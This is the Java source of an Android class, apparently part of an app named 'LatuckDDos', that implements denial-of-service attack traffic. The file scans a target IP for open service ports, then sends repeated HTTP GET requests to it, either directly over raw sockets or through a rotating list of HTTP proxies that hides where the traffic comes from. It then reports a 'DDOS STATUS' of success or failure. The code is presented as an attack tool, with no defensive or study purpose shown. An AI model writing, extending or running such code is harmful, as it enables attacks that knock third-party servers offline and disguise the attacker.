/*________________________________________________*//*


               Author: @Squatedev
               age: 19
               name: null


/*________________________________________________*/

package dev.squatedev.latuckddos.ProxySend;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.OutputStream;
import java.io.InputStream;

public class ProxyClient {
    private static ProxyClient instance;
    private Context context;
    private String tag = "LatuckDDos";
    private String nan = "n/a";
    private boolean lastRequestSuccess = false;
    private long lastPing = 0;

    private ProxyClient(Context context){
        if(context != null){
            this.context = context;
        } else {
            Log.i(tag, "Context class ProxyClient = null ");
        }
    }

    public static synchronized ProxyClient getInstance(Context ctx) {
        if(instance==null) instance = new ProxyClient(ctx);
        return instance;
    }

    private void sendMessage(String ip, String port){

    }

    public void sendDDOS(String ip, String port, String json, boolean autoFindPort, boolean useProxy){
        new Thread(() -> {
            String targetPort = port;
            if(autoFindPort) {
                targetPort = String.valueOf(findOpenPort(ip));
            }

            if(useProxy && json != null && !json.isEmpty()) {
                sendWithNextProxy(ip, targetPort, json);
            } else {
                sendDirectAttack(ip, targetPort);
            }
        }).start();
    }

    private int findOpenPort(String ip) {
        int[] ports = {80, 443, 8080, 8443, 22, 21, 3306, 3389, 53, 25, 110, 143, 993, 995, 465, 587};
        for(int port : ports) {
            try {
                long start = System.currentTimeMillis();
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(ip, port), 500);
                socket.close();
                return port;
            } catch (Exception e) {
            }
        }
        return 80;
    }

    private void sendWithNextProxy(String ip, String port, String json) {
        try {
            JSONObject jsonObject = new JSONObject(json);
            JSONArray proxies = jsonObject.getJSONArray("proxies");

            if(proxies.length() == 0) {
                lastRequestSuccess = false;
                return;
            }

            int index = (int)(System.currentTimeMillis() % proxies.length());

            JSONObject proxy = proxies.getJSONObject(index);
            String proxyIp = proxy.getString("ip");
            String proxyPort = proxy.getString("port");

            long startTime = System.currentTimeMillis();

            Proxy javaProxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyIp, Integer.parseInt(proxyPort)));
            URL url = new URL("http://" + ip + ":" + port);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection(javaProxy);
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(2000);
            connection.setReadTimeout(2000);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Connection", "keep-alive");

            int responseCode = connection.getResponseCode();
            lastRequestSuccess = (responseCode > 0);
            lastPing = System.currentTimeMillis() - startTime;

            connection.disconnect();

        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    private void sendDirectAttack(String ip, String port) {
        try {
            long startTime = System.currentTimeMillis();

            Socket socket = new Socket();
            socket.setTcpNoDelay(true);
            socket.setSoTimeout(3000);
            socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 3000);

            if(socket.isConnected()){
                OutputStream out = socket.getOutputStream();
                String request = "GET / HTTP/1.1\r\n" +
                        "Host: " + ip + "\r\n" +
                        "User-Agent: Mozilla/5.0\r\n" +
                        "Accept: */*\r\n" +
                        "Connection: close\r\n" +
                        "\r\n";
                out.write(request.getBytes());
                out.flush();

                lastRequestSuccess = true;
                lastPing = System.currentTimeMillis() - startTime;
            }

            socket.close();

        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    public String getServersPing(String json, int position){
        try {
            JSONObject jsonObject = new JSONObject(json);
            JSONArray proxies = jsonObject.getJSONArray("proxies");
            if(position >= 0 && position < proxies.length()) {
                JSONObject proxy = proxies.getJSONObject(position);
                String ip = proxy.getString("ip");
                String port = proxy.getString("port");

                long start = System.currentTimeMillis();
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1500);
                socket.close();
                return (System.currentTimeMillis() - start) + "ms";
            }
        } catch (Exception e) {
        }
        return nan;
    }

    public boolean getLastRequestSuccess(){
        return lastRequestSuccess;
    }

    public long getLastPing(){
        return lastPing;
    }

    public String getStatus() {
        StringBuilder html = new StringBuilder();

        html.append("<br>");
        html.append("<font color='#FFFFFF'><b>DDOS STATUS: </b></font>");
        if(lastRequestSuccess) {
            html.append("<font color='#00FF00'><b>SUCCESS ✓</b></font>");
        } else {
            html.append("<font color='#FF0000'><b>FAILED ✗</b></font>");
        }
        html.append("<br>");

        return html.toString();
    }
}